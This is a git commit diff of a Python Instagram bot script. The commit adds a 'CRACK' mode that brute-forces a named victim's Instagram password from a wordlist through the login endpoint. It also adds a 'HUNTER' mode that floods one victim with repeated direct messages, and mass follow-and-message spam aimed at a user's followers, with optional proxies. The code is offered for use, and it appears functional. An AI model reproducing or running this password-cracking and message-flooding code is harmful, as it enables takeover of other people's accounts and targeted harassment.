5e72bbadb95882304d740b8634ef7f451b1b1893
glandesmates <84640701+glandesmates@users.noreply.github.com>
2021-06-27 23:03:09 -0500

    Update main.py
    Brute force mode added (part of this option its from https://github.com/0xfff0800/Brute-force-Instagram-2021), i take the New_Br function and i edit him) .
    More simple usage.

--- main.py
+++ main.py
@@ -2,10 +2,13 @@ import os
 import sys
 import random
 import argparse as arg
-import pyautogui as auto
+import requests
+
 from time import sleep
 from instabot import Bot
+from datetime import datetime
 from colorama import init, Fore
+
 
 init(autoreset=True)
 
@@ -19,37 +22,46 @@ class Advertisement:
     step = Fore.LIGHTBLUE_EX + '<' + Fore.LIGHTBLACK_EX + '!' + Fore.LIGHTBLUE_EX + '> '
 
 
-to_user = 'vanessa.rhd', 'lanarohades', 'ladies', 'katekirienko', \
-          'xlightmoon.x', 'arigameplays', 'natalie.tananska'
+parser = arg.ArgumentParser()
 
-parser = arg.ArgumentParser(usage='You can choose f and m but its most probably to get a ban account. '
-                                  'You can stop process if you want with Ctrl + Shift + C')
-parser.add_argument('f', default=0, help='follow mode (1 true/ 0 false)', type=int)
-parser.add_argument('m', default=0, help='messages mode (1 true/ 0 false)', type=int)
-parser.add_argument('s', default=0, help='scrapping on instagram (1 true/ 0 false)', type=int)
-parser.add_argument('t', help='be a stalker on instagram (1 true/ 0 false)', type=int)
-parser.add_argument('-n', default=0, help='configure new accounts (upload photo, video, etc)')
-parser.add_argument('-to', help='user to follow or send dm to his followers', type=str,
-                    default=to_user[random.choice(range(0, 6))])
-parser.add_argument('-fo', help='max users to get: )', type=int)
-parser.add_argument('-cm', help='custom message', type=str)
-parser.add_argument('--media', help='send photo to users as dm (enter filepath)', type=str)
-parser.add_argument('--profile', help='send a profile to users as dm')
-parser.add_argument('-os', default=0, help="""operative system:
-                                    [1] windows
-                                    [2] macos
-                                    [3] linux""", type=int)
+proxy = parser.add_argument_group('  PROXY')
+proxy.add_argument('--proxy', help='[your proxy here]' ,type=str)
+
+positional = parser.add_argument_group(' POSITIONAL')
+positional.add_argument('max', help='[max count to actions]', type=int)
+positional.add_argument('user', help='[your victim here]',type=str)
+
+df = parser.add_argument_group(' GETTER')
+
+df.add_argument('-fol', help='[user to follow his followers]', type=str)
+df.add_argument('-msg', help='[your message here (send to all followers user)]', type=str)
+df.add_argument('--getinfo', help='[get information of followers user]', type=bool)
+df.add_argument('--media', help='[send pic as dm (filepath here)]', type=str)
+df.add_argument('--sendprof', help='[send profile (enter profile to send)]', type=str)
+
+hnt = parser.add_argument_group(' HUNTER')
+hnt.add_argument('-dm', help='[send massive dm´s to user victim (your message here)]', type=str)
+
+crk = parser.add_argument_group('  CRACK')
+crk.add_argument('-file', help='[file with passwords here]', type=str)
+
 args = parser.parse_args()
 
-if args.os == 1:
-    os.system('cls')
-elif args.os == 2 or args.os == 3:
-    os.system('clear')
-else:
-    pass
+_victim_ = args.user
+limit = args.max
+
+def clean():
+    try:
+        try:
+            os.system('cls')
+        except:
+            os.system('clear')
+    except:
+        pass
+clean()
 
 banner1 = """
- ██▓  ▄████       ██▓    ▄▄▄       ███▄    █  ▄▄▄▄    ▒█████  ▄▄▄█████▓     def see_mysocial(social, my_name):
+ ██▓  ▄████       ██▓    ▄▄▄       ███▄    █  ▄▄▄▄    ▒█████  ▄▄▄█████▓     def see_mysocial():
 ▓██▒ ██▒ ▀█▒     ▓██▒   ▒████▄     ██ ▀█   █ ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒           my_name = Mynor Estrada
 ▒██▒▒██░▄▄▄░     ▒██░   ▒██  ▀█▄  ▓██  ▀█ ██▒▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░           social = {
 ░██░░▓█  ██▓     ▒██░   ░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██░█▀  ▒██   ██░░ ▓██▓ ░                      'yt':'GlandesMates',
@@ -57,7 +69,7 @@ banner1 = """
 ░▓   ░▒   ▒  ▒▓▒ ░ ▒░▓  ░▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░              {
  ▒ ░  ░   ░  ░▒  ░ ░ ▒  ░ ▒   ▒▒ ░░ ░░   ░ ▒░▒░▒   ░   ░ ▒ ▒░     ░               print(my_name)
  ▒ ░░ ░   ░  ░     ░ ░    ░   ▒      ░   ░ ░  ░    ░ ░ ░ ░ ▒    ░                       for i in social:
- ░        ░   ░      ░  ░     ░  ░         ░  ░          ░ ░                                print(i + ': ', social[i])
+ ░        ░   ░      ░  ░     ░  ░         ░  ░          ░ ░                                print(f'{i}:{social[i]}')
               ░                                    ░                        see_mysocial()
                 #Use -h command to see all options
 """
@@ -67,26 +79,98 @@ for banner in banner1:
     print(random.choice(colors) + banner, end='')
     sys.stdout.flush()
     sleep(0)
-bot = Bot(
-    unfollow_delay=1, follow_delay=1, filter_private_users=True,
-    filter_users_without_profile_photo=True, filter_verified_accounts=True, message_delay=1
-)
+
+
+global count
+count = 0
+
+
+def cracker(user, pwd):
+    link = 'https://www.instagram.com/accounts/login/'
+    login_url = 'https://www.instagram.com/accounts/login/ajax/'
+    time = int(datetime.now().timestamp())
+    
+    payload = {
+        'username': user,
+        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
+        'queryParams': {},
+        'optIntoOneTap': 'false'
+    }
+
+    with requests.Session() as s:
+        r = s.get(link)
+        r = s.post(login_url, data=payload, headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": "https://www.instagram.com/accounts/login/",
+            "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
+        })
+
+        global data
+        data = r.json()
+
+if args.file:
+
+    try:
+        count = 0
+        with open(args.file, 'r') as file:
+            for pwd in file.readlines():
+                cracker(_victim_, pwd)
+                try:
+                    if data['authenticated'] == False:
+                        clean()
+                        print(f'\t{pwd} \tis not the password')
+                    elif data['authenticated'] == True:
+                        print(f'\tCracked! {_victim_}||{pwd} > is the password')
+                    else:
+                        print(data)
+                        break
+                except:
+                    print(data)
+                    pass
+                count += 1
+                if count == limit:
+                    print(f'\tProcess finished cause limit has reached, passwords tried: {limit}. Last password {pwd}')
+                    break
+    except KeyboardInterrupt or Exception as e:
+        if e is False:
+            print('The user breaks the script')
+        else:
+            print(f'File {args.file} does not exists')
+            raise e
+    exit()        
+
+global bot
+if args.proxy:
+    bot = Bot(
+        unfollow_delay=1, follow_delay=1, filter_private_users=True,
+        filter_users_without_profile_photo=True, filter_verified_accounts=True, message_delay=1, proxy=args.proxy
+    )
+elif not args.proxy:
+    bot = Bot(
+        unfollow_delay=1, follow_delay=1, filter_private_users=True,
+        filter_users_without_profile_photo=True, filter_verified_accounts=True, message_delay=1
+    )
+
+
 print('\n' + Advertisement.warning + Fore.CYAN +
       ' After this, you need to delete the session and cookies archives, and you can change the users list''\n''\n')
 
 user = input(Advertisement.step + Fore.WHITE + '\tUsername: ')
 pwd = input(Advertisement.step + Fore.WHITE + '\tPassword: ')
 print('\n')
+
 try:
-    bot.login(username=user, password=pwd)
+    if not args.file:
+        bot.login(username=user, password=pwd)
+    else:
+        pass
 except Exception as e:
     print(f'\tCan not login with {user} for cause:\n {e}')
 
-if args.to == 1:
-    her_user = args.to
-else:
-    her_user = random.choice(to_user)
-
+global victim, followers
+victim = bot.get_user_id_from_username(_victim_)
+followers = bot.get_user_followers(victim, nfollows=limit)
 
 def user_or_error(error):
     if error is True:
@@ -96,175 +180,90 @@ def user_or_error(error):
             '\n\t\t' + Advertisement.warning + Fore.RED + 'Process interrupted by user'
         )
 
-
-def load_archives(load, pic):
-    try:
-        load
-    except Exception as e:
-        if e is True:
-            raise e
-        else:
-            print(f'\tFile does not exist {pic}')
-
-
-if args.n:
-    print("""
-    You select the mode -n,
-    what do you want to do?:
-    ----------------------
-    {0} Profile picture
-    {1} Upload photo
-    {2} Upload video
-    {3} Upload story photo
-    {4} All
-    ----------------------
-          """)
-    uploader = int(input('\t\t'))
-    if uploader == 1:
-        pic_upl = input('\tPhoto path: ')
-        load_archives(bot.upload_photo(pic_upl), pic_upl)
-    elif uploader == 2:
-        vid_upl = input('\tVideo path: ')
-        load_archives(bot.upload_video(vid_upl), vid_upl)
-    elif uploader == 3:
-        story_pic = input('\tStory photo path: ')
-        load_archives(bot.upload_story_photo(story_pic), story_pic)
-    elif uploader == 0:
-        prof_pic = input('\tProfile picture path: ')
-        load_archives(bot.api.configure_photo(prof_pic), prof_pic)
-    elif uploader == 4:
-        pic_upl = input('\tPhoto path: ')
-        vid_upl = input('\tVideo path: ')
-        story_pic = input('\tStory photo path: ')
-        prof_pic = input('\tProfile picture path: ')
-        load_archives(bot.upload_photo(pic_upl), pic_upl)
-        load_archives(bot.upload_video(vid_upl), vid_upl)
-        load_archives(bot.upload_story_photo(story_pic), story_pic)
-        load_archives(bot.api.configure_photo(prof_pic), prof_pic)
+def info(user):
+    if args.getinfo == True:
+        bot.get_user_info(user)
     else:
         pass
-else:
-    pass
 
-if args.m == 1:
-    id_user = bot.get_user_id_from_username(her_user)
-    if args.fo:
-        followers = bot.get_user_followers(id_user, args.fo)
-    else:
-        followers = bot.get_user_followers(id_user)
-    for each_user in followers:
-        try:
-            bot.send_messages(user_ids=each_user, text=args.cm)
-            if args.media:
-                bot.send_photo(her_user, args.media)
-            else:
-                pass
-            if args.profile:
-                id_prof = bot.get_user_id_from_username(args.profile)
-                bot.send_profile(id_prof, her_user)
-            else:
-                pass
-        except KeyboardInterrupt or Exception as e:
-            user_or_error(e)
-elif args.cm == args.to:
-    id_user = bot.get_user_id_from_username(her_user)
-    if args.fo:
-        followers = bot.get_user_followers(id_user, args.fo)
-    else:
-        followers = bot.get_user_followers(id_user)
+if args.fol and args.msg:
     try:
-        for each_user in followers:
-            bot.follow(each_user)
-            bot.send_message(args.cm, each_user)
-            if args.media:
-                bot.send_photo(her_user, args.media)
-            else:
-                pass
-            if args.profile:
-                id_prof = bot.get_user_id_from_username(args.profile)
-                bot.send_profile(id_prof, her_user)
-            else:
-                pass
-            if args.media:
-                bot.send_photo(her_user, args.media)
-            else:
-                pass
-            if args.profile:
-                id_prof = bot.get_user_id_from_username(args.profile)
-                bot.send_profile(id_prof, her_user)
-            else:
-                pass
+        global unfollow
+        unfollow = []
+
+        for usr in followers:
+            try:
+                info(usr)
+                bot.follow(usr)
+                bot.send_message(args.msg, usr)
+                unfollow.append(usr)
+                count += 1
+                print(f'\n\tMessages sended & users followed {count}')
+            except KeyboardInterrupt or Exception as e:
+                user_or_error(e)
+            if count == limit:
+                print('\n\tProcess finished. Starting unfollow users')
+                try:
+                    for unf in unfollow:
+                        bot.unfollow(unf)
+                except KeyboardInterrupt or Exception as e:
+                    user_or_error(e)
+                break
     except KeyboardInterrupt or Exception as e:
         user_or_error(e)
-if args.s == 1:
-    print(f"""
-    [1] Get messages from {user}
-    [2] Get followers info from {her_user}
-    Coming soon...
-    --------------------------------------
-    """)
-    scraper = int(input('\t\t'))
-    if scraper == 1:
-        bot.get_messages()
-    elif scraper == 2:
-        id_user = bot.get_user_followers(her_user)
-        if args.fo:
-            followers = bot.get_user_followers(id_user, args.fo)
-        else:
-            followers = bot.get_user_followers(id_user)
-        count = 0
-        for users_info in followers:
-            print(bot.get_user_info(users_info))
+elif args.fol and not args.msg:
+    try:
+        while count != limit:
+            bot.follow_followers(victim, nfollows=limit)
             count += 1
-            if count == args.fo:
-                print('\tUsers information process finished...')
+            if count == limit:
+                print(f'\n\tSucesfully followed {limit} users. Starting unfollowing users')
+                bot.unfollow_non_followers()
                 break
-if args.to == 1:
-    print(f"""
-    [1] Send likes to followers from {her_user}
-    Coming soon...
-    -------------------------------------------
-    """)
-    stalker = int(input('\t\t'))
-    if stalker == 1:
-        if args.to == 1 and args.fo:
-            count = 0
-            id_user = bot.get_user_id_from_username(her_user)
-            followers = bot.get_user_followers(id_user, args.fo)
-            for each_user in followers:
-                bot.like_user(each_user)
-                count += 1
-                if count == args.fo:
-                    break
-bot.logout()
+    except KeyboardInterrupt or Exception as e:
+        user_or_error(e)
+elif args.msg and not args.fol:
+    try:
+        for usr in followers:
+            bot.send_message(args.msg, usr)
+            if args.media:
+                bot.send_photo(usr, args.media)
+            if args.sendprof:
+                bot.send_profile(args.sendprof, usr, args.msg)
+            count += 1
+            print(f'\tMessages sended {count}')
+            if count == limit:
+                print(f'\tSucesfully sended {limit} messages')
+                break
+    except KeyboardInterrupt or Exception as e:
+        user_or_error(e)
+if args.dm:
+    while count != limit:
+        bot.send_message(args.dm, victim)
+        count += 1
+        print(f'\n\tYou send {count} messages to user {_victim_}')
+        if count == limit:
+            print(f'\n\tYou finally send {limit} messages to user {_victim_}')
+            break
 
 
-def writer(text, time):
-    auto.typewrite(text)
-    auto.press('enter')
-    sleep(time)
+if not args.file:
 
+    bot.logout()
 
-if args.os == 1:
-    writer('start', 2)
-    writer('cd config', 3)
-    writer('DEL ' + user + '_uuid_and_cookie.json', 0)
-    writer('DEL ' + user + '.checkpoint', 0)
-elif args.os == 2 or args.os == 3:
-    auto.hotkey('ctrl', 'shift', 'n')
-    sleep(2)
-    writer('cd config', 0)
-    writer('rm' + user + '_uuid_and_cookie.json', 0)
-    writer('rm' + user + '.checkpoint', 0)
+    os.chdir('config')
+    os.remove(f'{user}.checkpoint')
+    os.remove(f'{user}_uuid_and_cookie.json')
+    
+    print(
+        Advertisement.message +
+        Fore.CYAN +
+        '\n\t\t\t\tSee you later influencer ;)\n'
+    )
 else:
     print(
-        Advertisement.warning +
-        Fore.RED +
-        '\n\tYou dont specify an OS so...'
-        '\n\tyou had to delete by yourself the archives in config file'
+
+        Advertisement.message +
+        Fore.CYAN +
+        '\n\t\t\t\tSee you later influencer ;)\n'
     )
-print(
-    Advertisement.message +
-    Fore.CYAN +
-    '\n\t\t\t\tSee you later influencer ;)\n'
-)
